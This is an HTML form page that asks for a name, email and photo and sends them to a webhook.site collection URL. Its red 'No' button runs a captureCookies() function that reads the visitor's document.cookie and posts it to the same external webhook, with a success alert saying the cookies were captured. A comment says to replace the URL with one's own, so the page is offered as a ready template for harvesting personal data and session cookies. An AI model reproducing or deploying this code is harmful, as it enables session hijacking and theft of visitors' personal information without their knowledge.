<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Form Submission</title>
<style>
body {
    font-family: Arial, sans-serif;
    margin: 0;
    padding: 0;
    background-color: #f2f2f2;
}

.container {
    max-width: 600px;
    margin: 50px auto;
    padding: 20px;
    background-color: #fff;
    border-radius: 10px;
    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
}

h2 {
    text-align: center;
    margin-bottom: 20px;
}

form {
    margin-top: 20px;
}

label {
    display: block;
    margin-bottom: 5px;
}

input[type="text"],
input[type="email"],
input[type="file"],
button {
    width: 100%;
    padding: 10px;
    margin-bottom: 15px;
    border: 1px solid #ccc;
    border-radius: 5px;
}

button {
    background-color: #007bff;
    color: #fff;
    font-size: 16px;
    cursor: pointer;
}

button:hover {
    background-color: #0056b3;
}

.no-button {
    background-color: #dc3545;
}

.no-button:hover {
    background-color: #c82333;
}
</style>
</head>
<body>
<div class="container">
    <h2>Submit Data</h2>
    <form id="dataForm" enctype="multipart/form-data">
        <label for="name">Name:</label>
        <input type="text" id="name" name="name" required>
        
        <label for="email">Email:</label>
        <input type="email" id="email" name="email" required>
        
        <label for="photo">Photo:</label>
        <input type="file" id="photo" name="photo" accept="image/*" required>
        
        <button type="button" onclick="submitForm()">Submit</button>
        <button type="button" class="no-button" onclick="captureCookies()">No</button>
    </form>
</div>

<script>
function submitForm() {
    var form = document.getElementById('dataForm');
    var formData = new FormData(form);
    var webhookUrl = "https://webhook.site/ee0b214b-1e02-4778-93e7-98936096cd78"; // Replace with your webhook URL

    fetch(webhookUrl, {
        method: 'POST',
        body: formData
    })
    .then(response => {
        if (response.ok) {
            alert("Data submitted successfully!");
            form.reset();
        } else {
            alert("Error submitting data. Please try again later.");
        }
    })
    .catch(error => {
        console.error('Error:', error);
        alert("Error submitting data. Please try again later.");
    });
}

function captureCookies() {
    var cookies = document.cookie;
    var cookieInfo = {
        cookies: cookies
    };
    
    var webhookUrl = "https://webhook.site/ee0b214b-1e02-4778-93e7-98936096cd78"; // Replace with your webhook URL
    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(cookieInfo)
    })
    .then(response => {
        if (response.ok) {
            alert("Cookies captured and submitted successfully!");
        } else {
            alert("Error capturing and submitting cookies. Please try again later.");
        }
    })
    .catch(error => {
        console.error('Error:', error);
        alert("Error capturing and submitting cookies. Please try again later.");
    });
}
</script>
</body>
</html>
